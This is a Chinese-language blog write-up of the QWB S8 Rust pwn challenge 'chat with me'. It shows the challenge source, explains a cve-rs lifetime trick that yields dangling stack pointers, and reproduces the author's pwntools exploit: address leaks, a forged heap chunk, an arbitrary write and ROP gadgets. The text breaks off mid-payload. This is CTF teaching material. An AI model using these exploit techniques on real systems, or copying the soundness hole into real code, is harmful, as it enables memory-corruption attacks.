    <published>2024-12-12T08:14:22.000Z</published>
    <updated>2024-12-13T07:52:08.087Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>到手之后是一个扣了符号的rust程序，非常的恶心。</p><h1>最后看看出题人的分享</h1><blockquote><p><a href="https://bbs.kanxue.com/thread-284240.htm">https://bbs.kanxue.com/thread-284240.htm</a></p></blockquote><h2 id="源码：">源码：</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;<span class="keyword">self</span>, Read, Write&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> MAX_MSG_LEN: <span class="type">usize</span> = <span class="number">0x50</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    data: [<span class="type">u8</span>; MAX_MSG_LEN],</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        Msg &#123;</span><br><span class="line">            data: [<span class="number">0</span>; MAX_MSG_LEN],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">fmt</span>::Display <span class="keyword">for</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> fmt::Formatter) <span class="punctuation">-&gt;</span> fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;:?&#125;&quot;</span>, <span class="keyword">self</span>.data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">prompt</span>(msg: <span class="type">String</span>) &#123;</span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125; &gt; &quot;</span>, msg);</span><br><span class="line">    io::<span class="title function_ invoke__">stdout</span>().<span class="title function_ invoke__">flush</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ChatBox</span> &#123;</span><br><span class="line">    msg_list: <span class="type">Vec</span>&lt;&amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg&gt;,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">ChatBox</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        ChatBox &#123;</span><br><span class="line">            msg_list: <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>(),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">add_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Adding a new message&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">push</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">get_ptr</span>());</span><br><span class="line">        <span class="built_in">println!</span>(</span><br><span class="line">            <span class="string">&quot;Successfully added a new message with index: &#123;&#125;&quot;</span>,</span><br><span class="line">            <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">len</span>() - <span class="number">1</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">show_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Content: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.msg_list[index]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">edit_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Content&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">handle</span> = io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">lock</span>();</span><br><span class="line">        handle.<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>.msg_list[index].data).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Content: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.msg_list[index]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">delete_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">remove</span>(index);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">get_ptr</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg &#123;</span><br><span class="line">        <span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(_val_a: &amp;<span class="symbol">&#x27;a</span> &amp;<span class="symbol">&#x27;b</span> (), val_b: &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">                val_b</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">            <span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span> = Msg::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> msg)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">chat_box</span> = ChatBox::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;I am a chatting bot of QWB S8, you can chat with me.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;If you delight me, I will give you flag!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;This is function menu: &quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;2. show&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;3. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Choice&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">choice</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> choice).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">choice</span>: <span class="type">i8</span> = choice.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">match</span> choice &#123;</span><br><span class="line">            <span class="number">1</span> =&gt; chat_box.<span class="title function_ invoke__">add_msg</span>(),</span><br><span class="line">            <span class="number">2</span> =&gt; chat_box.<span class="title function_ invoke__">show_msg</span>(),</span><br><span class="line">            <span class="number">3</span> =&gt; chat_box.<span class="title function_ invoke__">edit_msg</span>(),</span><br><span class="line">            <span class="number">4</span> =&gt; chat_box.<span class="title function_ invoke__">delete_msg</span>(),</span><br><span class="line">            <span class="number">5</span> =&gt; <span class="keyword">break</span>,</span><br><span class="line">            _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Invalid Choice!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目漏洞点的核心在于这个poc函数，来自于<a href="https://github.com/Speykious/cve-rs">cve-rs</a>并在UIUCTF2024 Rusty Pointer中用过的：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_ptr</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg &#123;</span><br><span class="line">        <span class="keyword">const</span> S: &amp;&amp;() = &amp;&amp;();<span class="comment">// 定义一个常量 S，它是一个指向空元组的引用的引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义一个泛型函数 get_ptr，接受一个可变引用 x，并返回一个不同生命周期的可变引用</span></span><br><span class="line">        <span class="keyword">fn</span> <span class="title function_">get_ptr</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">            <span class="comment">// 定义一个辅助函数 ident，接受两个参数：一个引用的引用和一个可变引用</span></span><br><span class="line">            <span class="keyword">fn</span> <span class="title function_">ident</span>&lt;<span class="symbol">&#x27;a</span>, <span class="symbol">&#x27;b</span>, T: ?<span class="built_in">Sized</span>&gt;(_val_a: &amp;<span class="symbol">&#x27;a</span> &amp;<span class="symbol">&#x27;b</span> (), val_b: &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T &#123;</span><br><span class="line">                val_b</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 定义一个函数指针 f，指向 ident 函数</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">f</span>: <span class="title function_ invoke__">fn</span>(_, &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;b</span> <span class="keyword">mut</span> T = ident;</span><br><span class="line">            <span class="title function_ invoke__">f</span>(S, x)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span> = Msg::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="title function_ invoke__">get_ptr</span>(&amp;<span class="keyword">mut</span> msg)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数的目的是“通过对变量静态生存周期的混淆，欺骗编译器不释放离开生存期的变量，从而获得一个离开生命周期后仍然可用的指针”，本题中vec里的那一个个栈上地址能够被使用就是因为这个函数。反正就是来回套娃，利用了一个骗过rust编译器生命周期的技巧来实现这一点。</p><p>原理这块先鸽了。</p><h2 id="exp：">exp：</h2><p>出题人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">author: GeekCmore</span></span><br><span class="line"><span class="string">time: 2024-10-30 17:06:06</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">filename = <span class="string">&quot;/home/geekcmore/Desktop/qwb/chat_with_me/attachments/pwn&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="number">6666</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *$rebase(0x1A979)</span></span><br><span class="line"><span class="string">b /home/geekcmore/RustroverProjects/chat-with-me/src/main.rs:145</span></span><br><span class="line"><span class="string">set debug-file-directory /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript=gs)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"> </span><br><span class="line">p = start()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content &gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Choice &gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tidy</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    y = p.recvline()[<span class="number">1</span>:-<span class="number">2</span>].decode().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    values = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            tmp += <span class="built_in">int</span>(y[i * <span class="number">8</span> + <span class="number">7</span> - j])</span><br><span class="line">            tmp &lt;&lt;= <span class="number">8</span></span><br><span class="line">        tmp &gt;&gt;= <span class="number">8</span></span><br><span class="line">        values.append(tmp)</span><br><span class="line">    info([<span class="built_in">hex</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> values])</span><br><span class="line">    <span class="keyword">return</span> values</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">addr_list = tidy()</span><br><span class="line">stack_addr = addr_list[<span class="number">4</span>]</span><br><span class="line">elf.address = addr_list[<span class="number">5</span>] - <span class="number">0x635B0</span></span><br><span class="line">heap_addr = addr_list[<span class="number">1</span>]</span><br><span class="line">success(<span class="string">f&quot;stack_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;elf_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(elf.address)&#125;</span>&quot;</span>)</span><br><span class="line">success(<span class="string">f&quot;heap_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br><span class="line">fake_heap = p64(<span class="number">1</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">1</span>) * <span class="number">2</span> + p64(heap_addr - <span class="number">0x2010</span>) + p64(<span class="number">0x1FE1</span>)</span><br><span class="line">edit(<span class="number">0</span>, fake_heap)</span><br><span class="line">tidy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add()</span><br><span class="line">info(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_qword</span>(<span class="params">addr, qword</span>):</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x51</span>) + p64(addr))</span><br><span class="line">    info(<span class="string">f&quot;Write <span class="subst">&#123;<span class="built_in">hex</span>(u64(qword))&#125;</span> to [<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>]&quot;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, qword)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_write</span>(<span class="params">addr, content</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), <span class="number">8</span>):</span><br><span class="line">        arb_qword(addr + i, content[i : i + <span class="number">8</span>])</span><br><span class="line"> </span><br><span class="line">ret_addr = stack_addr + <span class="number">0x3D0</span></span><br><span class="line">syscall = elf.address + <span class="number">0x0000000000026FCF</span></span><br><span class="line">pop_rdi_rbp = elf.address + <span class="number">0x000000000001DD45</span></span><br><span class="line">pop_rsi_rbp = elf.address + <span class="number">0x000000000001E032</span></span><br><span class="line">pop_rax = elf.address + <span class="number">0x0000000000016F3E</span></span><br><span class="line">pop_rdx_xor_ptrax = elf.address + <span class="number">0x0000000000045DC5</span></span><br><span class="line">sub_rdx_rcx_add_rax_rcx = elf.address + <span class="number">0x000000000001FC60</span></span><br><span class="line">pop_rcx = elf.address + <span class="number">0x0000000000017FFF</span></span><br><span class="line">ret = elf.address + <span class="number">0x0000000000016BD8</span></span><br><span class="line">payload = <span 